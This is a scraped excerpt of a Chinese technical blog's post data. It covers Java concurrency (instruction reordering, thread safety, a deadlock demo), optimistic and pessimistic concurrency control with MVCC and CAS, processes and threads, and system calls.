上面代码中，由于语句1和语句2没有数据依赖性，因此可能会被重排序。假如发生了重排序，在线程1执行过程中先执行语句2，而此是线程2会以为初始化工作已经完成，那么就会跳出while循环，去执行doSomethingwithconfig(context)方法，而此时 context 并没有被初始化，就会导致程序出错。 总结： 指令重排序不会影响单个线程的执行，但是会影响到线程并发执行的正确性。 要想并发程序正确地执行，必须要保证原子性、可见性以及有序性。只要有一个没有被保证，就有可能会导致程序运行不正确。 线程安全 当一个可变（mutable）对象会被多个线程访问时，就要考虑这个线程是不是需要被设计成线程安全的。 一个类会被称为线程安全（thread-safe）的，当它被从多个线程访问，而且无论这些线程如何被调度（scheduling）和交叉（interleaving）执行，而且在调用代码（calling code）中不需要额外的同步（synchronization）或者其他协调（coordiantion）机制，它的行为仍然正确（若预期执行）。 换句话说，线程安全的类封装（encapsulate）了已经需要的同步机制，因此客户端或者说调用者不再需要关注或者提供这些同步机制。 值得一提的是，无状态（stateless）的对象总是线程安全的。 以一个无状态的 servlet 为例： 12345678@ThreadSafe public class StatelessFactorizer implements Servlet &#123; public void service(ServletRequest req, ServletResponse resp) &#123; BigInteger i = extractFromRequest(req); BigInteger[] factors = factor(i); encodeIntoResponse(resp, factors); &#125; &#125; 在这个例子中，临时的状态被存储在这个线程对应的栈（stask）中的局部变量（local variables）中，因而只能被这个线程访问。 当多个线程可以同时访问一个可变状态（mutable state）变量，且没有同步机制时，这个程序就会有 bug，我们通过以下任何一种方式解决： 不要在线程之间共享状态变量（state variable）； 使得状态变量的状态不可改变（immutable）； 增加同步机制。 死锁（Deadlock）多线程编程中最难以把握的就是临界区线程安全问题，稍微不注意就会出现死锁的情况，一旦产生死锁就会造成系统功能不可用。 12345678910111213141516171819202122232425262728293031323334353637383940public class Main &#123; private static String resource_a = \"A\"; private static String resource_b = \"B\"; public static void main(String[] args) &#123; deadLock(); &#125; public static void deadLock() &#123; Thread threadA = new Thread(new Runnable() &#123; @Override public void run() &#123; synchronized (resource_a) &#123; System.out.println(\"get resource a\"); try &#123; Thread.sleep(3000); synchronized (resource_b) &#123; System.out.println(\"get resource b\"); &#125; &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; &#125; &#125;); Thread threadB = new Thread(new Runnable() &#123; @Override public void run() &#123; synchronized (resource_b) &#123; System.out.println(\"get resource b\"); synchronized (resource_a) &#123; System.out.println(\"get resource a\"); &#125; &#125; &#125; &#125;); threadA.start(); threadB.start(); &#125;&#125; 在上面的这个 demo 中，开启了两个线程 threadA ，threadB。其中 threadA 占用了 resource_a , 并等待被 threadB 释放的 resource _b 。threadB 占用了 resource _b ，且正在等待被 threadA 释放的 resource _a。因此 threadA 和 threadB出现了线程安全的问题，并形成死锁。 那么，通常可以用如下方式避免死锁的情况： 避免一个线程同时获得多个锁； 避免一个线程在锁内部占有多个资源，尽量保证每个锁只占用一个资源； 尝试使用定时锁，使用lock.tryLock(timeOut)，当超时等待时当前线程不会阻塞； 对于数据库锁，加锁和解锁必须在一个数据库连接里，否则会出现解锁失败的情况。 Reference 《Java Concurrency in Practice》 并发编程的优缺点 - https://juejin.im/post/5ae6c3ef6fb9a07ab508ac85 Java并发编程：volatile关键字解析 - https://www.cnblogs.com/dolphin0520/p/3920373.html","comments":true,"categories":[{"name":"Programming","slug":"Programming","permalink":"http://swsmile.info/categories/Programming/"}],"tags":[{"name":"Programming","slug":"Programming","permalink":"http://swsmile.info/tags/Programming/"}]},{"title":"【并发控制】乐观并发控制（Optimistic Concurrency Control）与悲观并发控制（Pessimistic Concurrency Control）","date":"2019-02-17T06:40:02.000Z","path":"2019/02/17/【Operating-System】并发控制（Concurrency Control）/","text":"Update 2020.6.1 update：今天和室友讨论，发现大家都看的是 “乐观锁、悲观锁，这一篇就够了！” （https://segmentfault.com/a/1190000016611415）来学习乐观并发控制和悲观并发控制。 然而，这篇文章中提到了“乐观锁”的概念，而这个词本身就是自相矛盾的，i.e., 锁（lock），或者称为互斥锁（mutex）本身就是基于悲观并发控制思想，所以根本不存在“乐观锁”这种锁。取而代之，将其称为“乐观并发控制思想”则相对更合适。 其实，搜索一下”optimistic locking”，发现仍然还是有很多的结果，这说明这其实不是因为翻译的原因。 今天突然意识到了这个问题，于是重新更新了这篇 blog。 Background并发控制（Concurrency Control）需要并发控制（Concurrency Control），其实是为了实现某些一致性规则（consistency rules）。 需要并发控制的一些场景： 实现数据库的 ACID 中的一致性（consistency） 编程中的实现互斥（mutual exclusion），比如Java中的 synchrinzed 方法 对应地，如果需要并发控制机制，但又没有应用任何并发控制机制，自然会产生某些问题，典型的包括： Read-copy-update The lost update problem: A second transaction writes a second value of a data-item (datum) on top of a first value written by a first concurrent transaction, and the first value is lost to other transactions running concurrently which need, by their precedence, to read the first value. The transactions that have read the wrong value end with incorrect results. The dirty read problem: Transactions read a value written by a transaction that has been later aborted. This value disappears from the database upon abort, and should not have been read by any transaction (“dirty read”). The reading transactions end with incorrect results. The incorrect summary problem: While one transaction takes a summary over the values of all the instances of a repeated data-item, a second transaction updates some instances of that data-item. The resulting summary does not reflect a correct result for any (usually needed for correctness) precedence order between the two transactions (if one is executed before the other), but rather some random result, depending on the timing of the updates, and whether certain update results have been included in the summary or not. 悲观并发控制（Pessimistic Concurrency Control）与乐观并发控制（Optimistic Concurrency Control）乐观并发控制（Optimistic Concurrency Control）对应于生活中乐观的人总是想着事情往好的方向发展，悲观并发控制（Pessimistic Concurrency Control）对应于生活中悲观的人总是想着事情往坏的方向发展。这两种人各有优缺点，不能不以场景而定说一种人好于另外一种人。 悲观并发控制（Pessimistic Concurrency Control）悲观并发控制（Pessimistic Concurrency Control）总是假设最坏的情况，即每次去拿数据的时候都认为别人会修改，所以每次在修改数据的时候都会先把数据“锁起来”，来阻止其他人对数据的修改。 因此，自然地，实现悲观并发控制的最典型的方式就是使用锁（lock）了， 传统的关系型数据库里边就用到了很多这种锁机制，比如行锁，表锁等，读锁，写锁等，即，都是在做操作之前先上锁。 Java 中基于synchronized 关键字的独占锁（exclusive lock）就是基于悲观锁思想的实现。 当上锁后，即使别人想拿或者修改这个数据，也无法做到。因此， 他可能会不断的重试（直到拿到这个锁），这称为自旋（spin）； 也可能直接进入阻塞状态（目的是为了节省CPU时间片）。直接当锁被释放时，会被唤醒且尝试再次获取锁。 悲观并发控制通常来说会造成性能的下降。而且，有时还会出现错误情况，比如死锁（deallock） 乐观并发控制（Optimistic Concurrency Control）乐观并发控制（Optimistic Concurrency Control）则总是假设最好的情况，即认为每次去修改数据的时候，别人均不会修改，所以不会上锁，但是在更新的时候，会判断一下在此期间，别人有没有去更新这个数据。 代表乐观并发控制思想的代表： 多版本并发控制（Multiversion concurrency control, MVCC） 非阻塞算法（non-blocking algorithm），非阻塞算法都依赖于CPU指令集提供的原子修改原语指令（atomic read-modify-write primitives），最典型的非阻塞算法就是CAS 算法 （compare-and-swap） 场景： 像数据库提供的类似于 write_condition 的机制，其实都是基于乐观锁并发控制思想的体现。 在 Java 中java.util.concurrent.atomic 包中，提供了很多支持原子操作的类。如：AtomicBoolean、AtomicInteger、AtomicLong、AtomicReference 等，全都是基于乐观并发控制思想的 CAS 算法实现的。 在 SVN 、Git 等版本控制管理器中，也有乐观锁并发控制思想的体现。当你提交数据的时候对比下版本号，如果远程仓库的版本号和本地的不一样，就表示有人已经提交过代码了，你需要先更新代码到本地处理一下版本冲突问题，不然是没有办法提交的。 HTTP Header中的 If-Match，The GET method returns an ETag for a resource and subsequent PUTs use the ETag value in the If-Match headers; while the first PUT will succeed, the second will not, as the value in If-Match is based on the first version of the resource 乐观锁适用于多读少写的应用类型，这样可以提高吞吐量。 乐观并发控制的几个阶段Optimistic concurrency control transactions involve these phases: Begin: Record a timestamp marking the transaction’s beginning. Modify: Read database values, and tentatively write changes. Validate: Check whether other transactions have modified data that this transaction has used (read or written). This includes transactions that completed after this transaction’s start time, and optionally, transactions that are still active at validation time. Commit/Rollback: If there is no conflict, make all changes take effect. If there is a conflict, resolve it, typically by aborting the transaction, although other resolution schemes are possible. Care must be taken to avoid a TOCTTOU bug, particularly if this phase and the previous one are not performed as a single atomic operation. 乐观并发控制（Optimistic Concurrency Control）思想的分析从上面对两种并发控制思想的介绍，我们知道两种锁各有优缺点，不可认为一种好于另一种。 乐观并发控制适用于写比较少的情况下（多读场景），即冲突很少发生，这样可以省去了加锁的开销，提高了系统的整个吞吐量。但如果是多写的情况，一般会经常产生冲突，这就会导致上层应用会不断的进行不断地多次尝试（retry），这样反倒是降低了性能，所以一般多写的场景下用悲观并发控制机制就比较合适。 乐观并发控制思想常见的两种实现方式乐观锁可以使用多版本并发控制（Multiversion concurrency control, MVCC）或 CAS 算法来实现。 1 多版本并发控制（Multiversion concurrency control, MVCC）这里的版本号可以任何属性，只要当一次数据修改操作被执行后，这个属性一定会被改变即可，比如数据被修改的次数、版本号、时间戳（timestamp）。 一般是在数据表中加上一个数据版本号 version 字段，表示数据被修改的次数，当数据被修改时，version 值会加一。当线程 A 要更新数据值时，在读取数据的同时，也会读取 version 值，在提交更新时，若刚才读取到的 version 值为当前数据库中的 version 值相等时才更新，否则重试更新操作，直到更新成功。 取出记录时，获取当前 version； 更新时，带上这个 version； 执行更新，先执行 set version = newVersion where version = oldVersion； 如果上面执行的 set语句没有影响任何行，就更新失败； 并且不断重试。 举一个简单的例子： 假设数据库中帐户信息表中有一个 version 字段，当前值为 1 ；而当前帐户余额字段（ balance ）为 $100 。 操作员 A 此时将其读出（ version=1 ），并从其帐户余额中扣除 $50（ $100-$50 ）。 在操作员 A 操作的过程中，操作员B 也读入此用户信息（ version=1 ），并从其帐户余额中扣除 $20 （ $100-$20 ）。 操作员 A 完成了修改工作，将数据版本号加一（ version=2 ），连同帐户扣除后余额（ balance=$50 ），提交至数据库更新，此时由于提交数据版本大于数据库记录当前版本，数据被更新，数据库记录 version 更新为 2 。 操作员 B 完成了操作，也将版本号加一（ version=2 ）试图向数据库提交数据（ balance=$80 ），但此时比对数据库记录版本时发现，操作员 B 提交的数据版本号为 2 ，数据库记录当前版本也为 2 ，不满足 “ 提交版本必须大于记录当前版本才能执行更新 “ 的乐观锁策略，因此，操作员 B 的提交被驳回。 这样，就避免了操作员 B 用基于 version=1 的旧数据修改的结果覆盖操作员A 的操作结果的可能。 2 非阻塞算法（non-blocking algorithm）// TODO Wait-freedom Lock-freedom Obstruction-freedom 非阻塞算法的好处There are several benefits of non-blocking algorithms compared to blocking algorithms. This section will describe these benefits. ChoiceThe first benefit of non-blocking algorithms is, that threads are given a choice about what to do when their requested action cannot be performed. Instead of just being blocked, the request thread has a choice about what to do. Sometimes there is nothing a thread can do. In that case it can choose to block or wait itself, thus freeing up the CPU for other tasks. But at least the requesting thread is given a choice. On a single CPU system perhaps it makes sense to suspend a thread that cannot perform a desired action, and let other threads which can perform their work run on the CPU. But even on a single CPU system blocking algorithms may lead to problems like deadlock, starvation and other concurrency problems. No DeadlocksThe second benefit of non-blocking algorithms is, that the suspension of one thread cannot lead to the suspension of other threads. This means that deadlock cannot occur. Two threads cannot be blocked waiting for each other to release a lock they want. Since threads are not blocked when they cannot perform their requested action, they cannot be blocked waiting for each other. Non-blocking algorithms may still result in live lock, where two threads keep attempting some action, but keep being told that it is not possible (because of the actions of the other thread). No Thread SuspensionSuspending and reactivating a thread is costly. Yes, the costs of suspension and reactivation has gone down over time as operating systems and thread libraries become more efficient. However, there is still a high price to pay for thread suspension and reactivation. Whenever a thread is blocked it is suspended, thus incurring the overhead of thread suspension and reactivation. Since threads are not suspended by non-blocking algorithms, this overhead does not occur. This means that the CPUs can potentially spend more time performing actual business logic instead of context switching. On a multi CPU system blocking algorithms can have more significant impact on the overall performance. A thread running on CPU A can be blocked waiting for a thread running on CPU B. This lowers the level of parallelism the application is capable of achieving. Of course, CPU A could just schedule another thread to run, but suspending and activating threads (context switches) are expensive. The less threads need to be suspended the better. Reduced Thread LatencyLatency in this context means the time between a requested action becomes possible and the thread actually performs it. Since threads are not suspended in non-blocking algorithms they do not have to pay the expensive, slow reactivation overhead. That means that when a requested action becomes possible threads can respond faster and thus reduce their response latency. The non-blocking algorithms often obtain the lower latency by busy-waiting until the requested action becomes possible. Of course, in a system with high thread contention on the non-blocking data structure, CPUs may end up burning a lot of cycles during these busy waits. This is a thing to keep in mind. Non-blocking algorithms may not be the best if your data structure has high thread contention. However, there are often ways do redesign your application to have less thread contention. CAS 算法CAS 即 Compare And Swap（比较与交换），是一种无锁（Lock Free）的非阻塞算法（Non-blocking algorithm）的实现。 CAS 算法是基于乐观并发控制思想的实现体现。 无锁同步（Lock Free），即在不使用锁的情况下，实现多线程之间的变量同步，也就是在没有线程被阻塞的情况下实现变量的同步，所以也叫非阻塞同步（Non-blocking Synchronization）。 注意，无锁（lock-free）的非阻塞算法（nonblocking algorithms）有多种实现方法，CAS 算法只是其中的一种。 CAS 算法涉及到三个操作数： 需要读写的内存值 V 进行比较的值 A 拟写入的新值 B 当且仅当 V 的值等于 A 时，CAS 通过原子方式用新值B来更新V的值，否则不会执行任何操作（比较和替换是一个原子操作）。一般情况下是一个自旋操作，即不断的重试。 CAS 算法通过 CPU 指令集保证原子性（atomicity），因此不需要进行用户态（user mode）和内核态（kernel mode）的切换，也不需要进行线程的切换。 这其实和乐观锁的冲突检查+数据更新的原理是一样的。 乐观并发控制的缺点ABA 问题比如说一个线程 T1 从内存位置V中取出 A ，这时候另一个线程T2也从内存中取出 A ，并且 T2 进行了一些操作变成了 B ，然后 T2 又将 V 位置的数据变成 A，这时候线程 T1 进行 CAS 操作发现内存中仍然是 A ，然后 T1 操作成功。尽管线程 T1 的 CAS 操作成功，但可能存在潜在的问题。 一个通常的解决 ABA 问题的思路是增加时间戳，即在进行数据更新时，不仅仅对比当前值与开始操作之前的值是不是一致，还对比最后修改数据的时间戳是否一致。 循环时间长开销大自旋 CAS（不成功，就一直循环执行，直到成功）如果长时间不成功，会给 CPU 带来非常大的执行开销。 如果 JVM 能支持处理器提供的 pause 指令那么效率会有一定的提升，pause 指令有两个作用： 它可以延迟流水线执行指令（de-pipeline），使CPU不会消耗过多的执行资源，延迟的时间取决于具体实现的版本，在一些处理器上延迟时间是零。 它可以避免在退出循环的时候因内存顺序冲突（memory order violation）而引起CPU流水线被清空（CPU pipeline flush），从而提高CPU的执行效率。 只能保证一个共享变量的原子操作当对一个共享变量执行操作时，我们可以使用循环 CAS 的方式来保证原子操作，但是对多个共享变量操作时，循环 CAS 就无法保证操作的原子性。 这个时候就可以用锁，或者有一个取巧的办法，就是把多个共享变量合并成一个共享变量来操作。比如有两个共享变量 i ＝ 2,j = a ，合并一下 ij = 2a ，然后用 CAS 来操作 ij。从 Java 1.5 开始 JDK 提供了 AtomicReference 类来保证引用对象之间的原子性，你可以把多个变量放在一个对象里来进行 CAS 操作。 乐观并发控制的 CAS 与悲观并发控制的 Java synchronized 关键字的使用情景结论先行：CAS 适用于写比较少的情况下（多读场景，冲突一般较少），Java 的 synchronized 关键字适用于写比较多的情况下（多写场景，冲突一般较多）。 对于资源竞争较少（线程冲突较轻）的情况，使用 synchronized 同步锁进行线程阻塞和唤醒切换以及用户态内核态间的切换操作额外浪费消耗 CPU 资源；而 CAS 基于 CPU 指令集实现，不需要进入内核，不需要切换线程，操作自旋几率较少，因此可以获得更高的性能。 对于资源竞争严重（线程冲突严重）的情况，CAS 自旋的概率会比较大，从而浪费更多的 CPU 资源，效率低于 synchronized。 补充： Java 并发编程这个领域中 synchronized 关键字一直都是元老级的角色，很久之前很多人都会称它为 “重量级锁” 。但是，在 JavaSE 1.6 之后进行了主要包括为了减少获得锁和释放锁带来的性能消耗而引入的 偏向锁 和 轻量级锁 以及其它各种优化之后变得在某些情况下并不是那么重了。 synchronized 的底层实现主要依靠 Lock-Free 的队列，基本思路是自旋后阻塞，竞争切换后继续竞争锁，稍微牺牲了公平性，但获得了高吞吐量。在线程冲突较少的情况下，可以获得和 CAS 类似的性能；而线程冲突严重的情况下，性能远高于 CAS 。 Reference 《Modern Operating System 4th》 https://en.wikipedia.org/wiki/Concurrency_control#Concurrency_control_in_operating_systems https://en.wikipedia.org/wiki/Non-blocking_algorithm https://en.wikipedia.org/wiki/Compare-and-swap https://www.cs.cmu.edu/~410-s05/lectures/L31_LockFree.pdf https://en.wikipedia.org/wiki/Multiversion_concurrency_control https://en.wikipedia.org/wiki/Optimistic_concurrency_control http://tutorials.jenkov.com/java-concurrency/non-blocking-algorithms.html https://preshing.com/20120612/an-introduction-to-lock-free-programming/ 面试必备之乐观锁与悲观锁 - https://juejin.im/post/5b4977ae5188251b146b2fc8 乐观锁、悲观锁，这一篇就够了！- https://segmentfault.com/a/1190000016611415","comments":true,"categories":[{"name":"OperatingSystem","slug":"OperatingSystem","permalink":"http://swsmile.info/categories/OperatingSystem/"}],"tags":[{"name":"Operating System","slug":"Operating-System","permalink":"http://swsmile.info/tags/Operating-System/"}]},{"title":"【Operating System】进程 - 进程与线程","date":"2019-02-14T04:01:18.000Z","path":"2019/02/14/【Operating-System】进程-进程与线程/","text":"进程（Process）进程的概念进程（Process）是操作系统管理资源的基本单元。 一个进程对应有一块（内存）地址空间（address space），进程可以对这块自己的地址空间进行任意的读写，这块地址空间中包括可以执行的程序（executable program）代码区、数据区（program’s data）和栈（stack）。 同时，操作系统会维护一个进程表（process table），进程表是一个数组，用于管理当前系统中所有的进程。 进程状态在操作系统中，有三种状态： 运行（Running）：在这一刻使用CPU。 就绪（Ready）：可以被运行（runnable），只是暂时地被停止以让其他进程运行。 阻塞（Blocked）：不能被运行直到一些依赖的外部事件发生。 运行（Running）和就绪（Ready）是类似的，只是处于就绪情况时，暂时地没有可用的CPU时间片。当CPU有可用的时间片时，进程调度器（Process Schuduler）会将这个进程从就绪态切换为运行态。 阻塞（Blocked）与上面两种状态有本质上的不同，即使这时CPU空闲没有其他任务，这个进程也由于要等待依赖事件的发生而不能被运行。 进程状态状态机（State machine）下图是这三种状态变化的状态机（State Machine）： 状态迁移1当一个进程读取管道（pipe）或者特定文件，且此时还没有完成数据的获取时，进程会自动从运行态切换为阻塞态（发生状态迁移1）。 状态迁移2和状态迁移3状态迁移2和状态迁移3由进程调度器（Process Scheduler）触发，进程调度器是操作系统的一部分，而进程调度器对进程来说是透明的（进程不会意思到它的存在）。 当进程调度器认为一个正在运行的进程已经执行了足够长的时间，是时候到其他进程来占用CPU时间了，进程调度器就会将这个进程从运行态切换为就绪态（发生状态迁移2）。 类似的，当进程调度器认为是时候让这个进程来重新获得CPU了，进程调度器就会将这个进程从就绪态切换为运行态（发生状态迁移3）。 状态迁移4当依赖的外部数据到达，进程就会从阻塞态切换为就绪态（发生状态迁移4）。如果此时CPU空闲，进程就会紧接着从就绪态切换为运行态（发生状态迁移3）。 进程的调度（Process Scheduling）在不同的场景中，需要的调度算法是不同的。这些场景可以被分类为： 批处理（batch）系统 交互型（interactive）系统 实时（real-time）系统 进程间的通信（Interprocess Communication, IPC）潜在的进程间通信问题死锁（Deadlock）当两个进程同时占用多个被共享的资源时，就可能出现死锁。比如，A线程等待着B线程向其发送数据，而同时B线程也等待着A线程向其发送数据，此时就产生了死锁（Deadlock）。 数据不一致性（Data Inconsistency）当共享数据区同时被不同的进程修改时，数据不一致性就会发生，这也可以称为竞态条件/竞争条件（race condition）。竞斥条件是需要被避免的，否则程序会出现不按预期执行的情况。对应地，这个共享存储区被称为竞态资源（Race Resources）。 而修改竞态资源（共享数据区）的代码块，就称为临界区（critical section）。 共享缓存问题（Shared Buffer Problem）共享缓存问题（Shared Buffer Problem）是一个典型的数据不一致性（Data Inconsistency）例子。 一天，爸爸发现儿子的账号里只有100美元，于是决定存入50美元给儿子。而正在此时，儿子正在取钱，他打算取20美元（取钱后账号应该剩80美元）。 由于爸爸和儿子的操作同时进行，而且进行操作账号时没锁（Lock），最终可能出现他们操作之后，账号的余额为150美元。 使用汇编语言来描述这个过程： 我们需要引入互斥（mutual exclusion）机制，以避免多个进程同时进入临界区，最终避免数据不一致性（Data Inconsistency）的发生。 互斥机制从本质来说，是一种同步（synchronization）机制。 进程间通信方式进程间通信可以通过以下几种方式： 数据传输（Data transfer） 管道（pipe）：管道是一种半双工的通信方式，数据只能单向流动，联系一个进程的输出和另一个进程的输入。写入在管道的尾部，读出在管道的头部。管道只能传送无格式的字节流。 套接字（socket）：也是进程间的通信机制，与其它通信机制不同的是，它可以用于不同机器间的进程通信。 共享内存（Shared memory） 消息通信（Message comunication） 消息队列（message queue） 操作系统提供的信息通信：send()/receive() 信号（Signal） 信号量（semaphores）和管程（monitors） 进程互斥机制（Mutual Exclusion Facilities）为了解决上面的死锁或数据不一致问题，我们需要引入同步机制， 基于硬件的解决方案 禁止中断（Disabling Interrupts）：仅仅适用于单 CPU 系统，不适用于多 CPU 或多核系统； TSL 指令（The TSL Instruction）：TSL 表示 Test and Set Lock，TSL 指令从指令集支持层面保证了“检查-占锁”动作的原子性。TSL 指令的不足在于需要让进程进入忙等待（busy waiting）。 XCHG 指令 基于软件的解决方案 LockOne锁 LockTwo算法 Peterson 算法 Bakery 算法 Dekker 算法 各种同步机制的实现方法 信号量（Semaphores）：基于 TSL 或 XCHG 指令实现。 互斥锁（mutexes）：为信号量的特例，即二元信号量（Binary semaphores）。 基于 TSL 或 XCHG 指令实现； 实现了多进程/线程的互斥（mutual exclusion）访问，即在任一时刻，只能有一个进程/线程进入临界区状态（critical section）。 自旋锁（Spinlock）：也是一种实现互斥（mutual exclusion）的方式，相比于互斥锁（Mutex）会在因无法进入临界区而进入阻塞状态，因而放弃CPU，自旋锁则是不断循环并测试锁的状态（紧密循环（tight loop）），这样就一直占着CPU，这个过程也称为忙等待（busy waiting）。 管程（Monitor）：基于 TSL 或 XCHG 指令实现。 线程（Thread）为什么要有线程如果非要问为什么需要线程，还不如问为什么需要进程中还有其它的进程。这些进程中包含的其它迷你进程（Miniprocess），就是线程。 线程之所以说是迷你进程，是因为线程和进程有很多相似之处，比如线程和进程的状态都有运行，就绪，阻塞状态。 我们希望在一个应用程序中，多个任务能同时运行。他们其中的某些任务可能时不时会被阻塞。通过将这样的应用程序分解成多个串行（sequential）的线程，能够使它们伪并行（quasi-parallel）地运行。 这里讨论的上下文有一个前置条件，我们的CPU是单核单线程的。因此，在某一瞬间只有一个进程或其中的一个线程被运行。然而，通过拆分CPU时间片来做到“并行”。所以我们成为伪并行（quasi-parallel）。 我们希望有一种并行实体（Parallel entity），能够共享内存空间，且它又比进程要轻量（它们被创建/销毁时的成本低），这时线程就诞生了。 总结来说，线程的好处如下： 在很多程序中，需要多个线程互相同步或互斥地并行完成工作，将这些工作分解到不同的线程中去无疑简化了编程模型。 线程相比进程来说，更加的轻量，所以线程的创建和销毁的代价远远小于对应进程的操作（10到100倍）。 线程提高了性能，虽然线程宏观上是并行的，但微观上却是串行。从CPU角度而言，线程并无法提升性能，但如果某些线程涉及到等待资源（比如I/O，等待输入）时，多线程允许进程中的其它线程继续执行而不是整个进程被阻塞，因此提高了CPU的利用率，最终提升了性能。 在多CPU或多核的情况下，使用线程不仅仅在宏观上并行，在微观上也是并行的。 下面我们来看一个具体的例子： 就拿我写博客的LiveWriter来说，LiveWriter需要监听我打字输入的状态，还需要每隔5分钟对草稿进行自动保存。假设如果这个进程只有一个线程的话，那么当对草稿进行保存时，因为此时需要访问硬盘，而访问硬盘的时间线程是阻塞状态的，这时我的任何输入都会没有响应，这种用户体验是无法接受的，或许我们可以通过键盘或者鼠标的输入去中断保存草稿的过程，但这种方案也并不讨好。而使用多线程，每个线程仅仅需要处理自己那一部分应该完成的任务，而不用去关心和其它线程的冲突。因此简化了编程模型。如下图所示。 这里值得注意的是，上面的两个线程如果改成两个进程，那么达不到所要的效果，因为进程有自己独立的内存地址空间，而线程共享进程的内存地址空间。 经典的线程模型一个进程模型通常包含两个事务：资源的组织（grouping）和执行（execution）。在过去没有线程的操作系统中，资源的组织和执行都是由进程统一完成的。换句话说，完成一个任务所用到的数据资源和这个任务的执行都由一个进程管理。 当引入线程后，对于资源执行的管理粒度更细了，即进程对完成一个任务所用到的数据资源进行管理（通过存储在同一块内存区域）；而由进程中的线程来负责具体资源的执行，线程共享资源的组织（即一个进程中的多个线程均可访问进程的资源）。 线程，是每一个进程中执行的一个条线。线程虽然共享进程中的大多数资源，但线程也需要自己的一些资源，比如：用于标识下一条执行指令的程序计数器（Program Counter），一些容纳局部变量的寄存器（Register），以及用于记录执行历史的栈（Stack）。 总而言之：进程是组织资源的最小单位，而线程是安排CPU执行的最小单位。 我们来看一个例子，在 (a) 中，有三个进程，每个进程拥有自己的内存地址空间（address space）和一个单独的线程；而在 (b) 中，只有一个进程，这个进程中包含三个线程，且这三个线程共享同一块内存地址空间。 每一个进程和线程所独自占有的资源如下所示： 进程占有的资源 内存地址空间（Address space） 全局变量（Global variables） 打开的文件（Open files） 子进程（Child processes） 等待的警告（Pending alarms） 信号量和信号吹程序（Signals and signal handlers） 账户信息（Accounting information） 线程占有的资源 程序计数器（Program counter） 寄存器（Registers） 栈（Stack） 状态 （State） 线程与进程拥有完全相同的状态：运行（running）、阻塞（blocked）、就绪（ready）和停止（terminated）。 另外，每一个线程都拥有独立的栈（stack），如下图所示。在栈中，包含多个frame，每一个frame都对应一个被调用但未被返回的方法。在每一个frame中，包含这个方法的局部变量表（local variables）和这个方法的返回地址。 操作系统实现线程的几种方式在用户空间中实现线程若在用户空间（User Space）中实现线程，对内核而言，只存在包含一个单线程的进程。 这样的做法最大的好处在于当操作系统不支持线程时，我们仍然可以通过库函数（Library）来支持多线程。事实上，仍然有部分现代操作系统并不支持线程。 在这种模式下，在每一个进程中，都有一个自己进行管理的线程表（thread table）。 另外，在用户空间中实现线程还有一个好处，就是每一个进程都拥有定制化的线程调度算法。 有好处就有坏处，这种模式最致命的缺点也是由于操作系统不知道线程的存在，因此当一个进程中的某一个线程进行系统调用时，比如缺页中断而导致线程阻塞，此时操作系统会阻塞整个进程，即使这个进程中其它线程还在工作。还有一个问题是假如进程中一个线程长时间不释放CPU，因为用户空间并没有时钟中断机制，会导致此进程中的其它线程得不到CPU而持续等待。 在操作系统内核中实现线程若在操作系统内核（Kernel）中实现线程，内核会为每个进程维护一张线程表（thread table），以跟踪这个进程中所有线程的状态（比如有线程被销毁或新的线程被创建了）。在线程表中，每一行记录了每一个线程的寄存器、线程状态等信息。 在这种模式下，所有可能阻塞线程的调用都以系统调用（System Call）的方式实现，相比在用户空间下实现线程造成阻塞的运行时调用成本会高出很多。当一个线程阻塞时，操作系统可以选择将CPU交给同一进程中的其它线程，或是其它进程中的线程，而在用户空间下实现线程时，调度只能在本进程中执行，直到操作系统剥夺了当前进程的CPU。 因为在内核模式下实现进程的成本更高，一个比较好的做法是另线程回收利用，当一个线程需要被销毁时，仅仅是修改标记位，而不是直接销毁其内容，当一个新的线程需要被创建时，也同样修改被“销毁”的线程其标记位即可。 这种模式下同样还是有一些弊端，比如接收系统信号的单位是进程，而不是线程，那么由进程中的哪一个线程接收系统信号呢？如果使用了表来记录，那么多个线程注册则通过哪一个线程处理系统信号？ 混合模式还有一种实现方式是将上面两种模式进行混合，用户空间中进程管理自己的线程，操作系统内核中有一部分内核级别的线程，如下图所示。 在这种模式下，操作系统只能看到内核线程。用户空间线程基于操作系统线程运行。因此，程序员可以决定使用多少用户空间线程以及操作系统线程，这无疑具有更大的灵活性。而用户空间线程的调度和前面所说的在用户空间下执行实现线程是一样的，同样可以自定义实现。 进程与线程的区别 谈了这么多，我们来总结一下进程与线程的区别。 进程进程是运行着的程序，是系统进行资源分配的一个独立单位。进程之间相互独立，多个进程的内部数据和状态都是完全独立的；而同一进程的线程之间共享数据段（全局变量），但是每个线程有自己的程序计数器和栈。 线程线程是进程的一部分，是 CPU 调度和分派的基本单位，也是比进程更小的能独立运行的基本单位，线程基本不拥有系统资源，只拥有一点在运行中必不可少的资源（程序计数器，一组寄存器和栈），但是它可以和进程的其它线程共享一个进程所拥有的全部资源。每个线程有自己的栈（Stack），而共用主进程的堆（Heap）。 一个进程异常退出不会引起另外的进程运行异常；但是线程若异常退出一般是会引起整个进程奔溃。 而且，创建/撤销/切换进程的开销远大于线程的（创建线程比创建进程快10~100倍）。 Reference 《Modern Operating System 4th》 操作系统中的进程与线程 - https://www.cnblogs.com/CareySon/archive/2012/05/04/ProcessAndThread.html 进程，线程，协程与并行，并发 - https://www.jianshu.com/p/f11724034d50 4.1. Interprocess Communication - http://faculty.salina.k-state.edu/tim/ossg/IPC_sync/ipc.html 操作系统（四）：进程互斥 - http://blog.forec.cn/2016/11/24/os-concepts-4/","comments":true,"categories":[{"name":"OperatingSystem","slug":"OperatingSystem","permalink":"http://swsmile.info/categories/OperatingSystem/"}],"tags":[{"name":"Operating System","slug":"Operating-System","permalink":"http://swsmile.info/tags/Operating-System/"}]},{"title":"【Operating System】系统调用","date":"2019-02-14T03:12:51.000Z","path":"2019/02/14/【Operating-System】系统调用/","text":"背景操作系统有两大功能：向用户程序提供抽象（abstraction）和管理计算机资源，而向用户程序提供抽象（abstraction）是保证用户程序和操作系统的交互的基础。 系统调用（System Call）的概念系统调用（System Call）在硬件和用户进程之间提供了一层抽象层，它具体包括以下作用 向用户进程提供抽象的硬件接口：比如，当用户进程需要读取或者写入一个文件时，通过系统调用，用户进程就不需要关心磁盘的类型、文件系统的类型和文件存储的位置 保证系统的安全和稳定：内核相当于系统资源和用户空间之间的一层中间件（middleware），因此它会根据权限、用户等标准来控制系统资源的访问 在Linux中，也被称为 syscalls。 下图显示了POSIX API、C语言库和系统调用之间的关系： 当一个进程在用户模式（user mode）下运行用户程序，而这个用户程序希望执行一个系统服务（system service），比如从一个文件中读取数据，用户程序需要调用一个系统调用，这时，控制流会进入内核态（kernel mode），当内核执行完成后，最终将控制流返回给用户程序。 